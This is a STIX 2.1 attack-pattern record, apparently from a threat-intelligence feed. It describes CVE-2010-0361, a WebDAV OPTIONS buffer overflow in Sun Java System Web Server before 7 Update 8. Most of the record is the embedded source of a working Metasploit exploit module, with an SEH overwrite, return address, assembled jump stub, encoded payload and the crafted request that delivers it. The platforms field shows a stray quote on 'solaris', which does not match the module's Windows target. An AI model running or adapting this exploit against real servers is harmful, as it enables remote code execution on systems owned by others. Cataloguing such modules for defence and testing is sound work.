{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a42b19ff-2b03-488b-9dad-c31b86a93f06",
    "created": "2024-08-14T17:07:58.573114Z",
    "modified": "2024-08-14T17:07:58.573118Z",
    "name": "Sun Java System Web Server WebDAV OPTIONS Buffer Overflow",
    "description": " This module exploits a buffer overflow in Sun Java Web Server prior to version 7 Update 8. By sending an \"OPTIONS\" request with an overly long path, attackers can execute arbitrary code. In order to reach the vulnerable code, the attacker must also specify the path to a directory with WebDAV enabled.  This exploit was tested and confirmed to work on Windows XP SP3 without DEP. Versions for other platforms are vulnerable as well.  The vulnerability was originally discovered and disclosed by Evgeny Legerov of Intevydis. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sun_jsws_dav_options.rb",
            "external_id": "sun_jsws_dav_options.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0361"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sun Java System Web Server WebDAV OPTIONS Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Sun Java Web Server prior to\n        version 7 Update 8. By sending an \"OPTIONS\" request with an overly long\n        path, attackers can execute arbitrary code. In order to reach the vulnerable\n        code, the attacker must also specify the path to a directory with WebDAV\n        enabled.\n\n        This exploit was tested and confirmed to work on Windows XP SP3 without DEP.\n        Versions for other platforms are vulnerable as well.\n\n        The vulnerability was originally discovered and disclosed by Evgeny Legerov of\n        Intevydis.\n      },\n      'Author'         => 'jduck',\n      'References'     =>\n        [\n          [ 'CVE', '2010-0361' ],\n          [ 'OSVDB', '61851' ]\n        ],\n      'Platform'       => [ 'win' ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          # ugh.. crazy!\n          'BadChars' => ((0..8).to_a + (0xa..0x1f).to_a + [0x7f]).pack('C*'),\n          'DisableNops' => true,\n          'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n            }\n        },\n      'Targets'        =>\n        [\n          # No automatic target atm...\n          #[ 'Automatic', { } ],\n\n          [ 'Sun Java System Web Server 7.0 update 7 on Windows x86 (SEH)',\n            {\n              'Platform' => 'win',\n              'Arch'     => ARCH_X86,\n              'Offset'   => 760,\n              'Ret'      => 0x12012177 # p/p/r in xerces-C_2_6.dll\n            },\n          ],\n\n=begin\n          [ 'Sun Java System Web Server 7.0 update 7 on Windows x86 (saved ret)',\n            {\n              'Platform' => 'win',\n              'Arch'     => ARCH_X86,\n              'Offset'   => 184,\n              'Ret'      => 0xdeadbeef\n            },\n          ],\n\n          [ 'Sun Java System Web Server 7.0 update 7 on Linux x86',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_X86,\n              'Offset'   => 224,\n              # @ 220 - 0x09703e90\n              'Ret'      => 0xdeadbeef\n            },\n          ],\n\n          [ 'Sun Java System Web Server 7.0 update 7 on Windows x86',\n            {\n              'Platform' => 'solaris',\n              'Arch'     => ARCH_SPARC,\n              'Offset'   => 3133,\n              'Ret'      => 0xdeadbeef\n            },\n          ],\n=end\n\n          #\n          # You can use this in order to devise other targets..\n          #\n          [ 'Debug Target', { } ]\n        ],\n      'DisclosureDate' => '2010-01-20',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"The URI path of a WebDAV collection on the server\", '/webdav'])\n      ])\n\n  end\n\n  def check\n    res = send_request_raw(\n      {\n        'method'  => 'OPTIONS',\n        'proto'   => 'HTTP',\n        'version' => '1.0',\n        'uri'     => normalize_uri(datastore['PATH'])\n      }, 5)\n\n    info = http_fingerprint({ :response => res })  # check method\n    if (info =~ /Sun/)\n      print_status(\"Found server: #{info}\")\n      return Exploit::CheckCode::Detected\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    #\n    # various crashes from linux sjsws 7u7:\n    #\n    # 216 - 0xb5a7a384 <DACL_isMatchingSelf@plt+256>:       jmp    *0x268(%ebx), ebx: 0x41386741\n    # 220 - 0xb5a80000 <_ZN16DAVVirtualServerD1Ev+148>:     add    %ah,0x84d8bff(%edi,%edi,8), edi: 0x31684130\n    # 224 - 0x68413368 in ?? ()\n    # 244 - 0xb5a80ba4 <DACL_GetDACLListForUri+164>:        movl   $0xffffffff,(%eax), eax: 0x41306941\n    # 248 - 0xb5a836e7 <DACL_ReadDACLFile+79>:      movl   $0x0,(%edx), edx: 0x69413169\n    #\n    # on windows sjsws 7u7:\n    #\n    # 200 - 67413167 ??              ???\n    # 2000 - smashes SEH, hits end of stack, 357a4134\n    #\n\n    uri = ''\n    uri << datastore['PATH']\n    uri << '/' if uri[-1,1] != '/'\n\n    # Just crash it nicely...\n    if (target.name =~ /Debug Target/)\n      uri << Rex::Text.pattern_create(2000)\n      encoded = \"\\xcc\"\n      encoded << \"A\" * (payload_space - 2)\n      encoded << \"\\xcc\"\n\n      #sled = Rex::Text.charset_exclude(payload_badchars)\n      #encoded[32,sled.length] = sled\n\n    elsif (target.name =~ /\\(SEH\\)/)\n      off = target['Offset']\n      rest = ''\n      rest << rand_text_alphanumeric(off)\n\n      seh = generate_seh_record(target.ret)\n      stub = \"\n        sub esp, -0x1a0\n        pop ecx\n        pop ecx\n        sub ecx, 0x3c\n      still:\n        mov al, [ecx]\n        cmp al, 0x41\n        jne nope\n        inc ecx\n        jmp still\n      nope:\n        jmp ecx\n      \"\n      seh << Metasm::Shellcode.assemble(Metasm::Ia32.new, stub).encode_string\n\n      rest << Rex::Text.to_hex(seh, '%')\n      rest << \"A\" * 256\n      rest << payload.encoded\n      rest << rand_text_alphanumeric(2200 - rest.length)\n      uri << rest\n\n      encoded = rand_text_alphanumeric(32+rand(64))\n\n      # From CORE local PoC\n      #uri = '/' + (\"D\"*2000) + '/..' + datastore['PATH'] + '/' + rest\n    end\n\n    # NOTE: We could use this to avoid badchars, but it ends up putting a url encoded version\n    # of the payload in memory, not exactly what we want :-/\n    #encoded = Rex::Text.to_hex(pl, '%')\n\n    res = send_request_raw({\n      'method'  => 'OPTIONS',\n      'proto'   => 'HTTP',\n      'version' => '1.0',\n      'headers' =>\n        {\n          'Referrer' => encoded,\n          'User-Agent' => encoded\n        },\n      'uri'     => uri\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-20",
    "x_mitre_platforms": [
        "solaris'"
    ]
}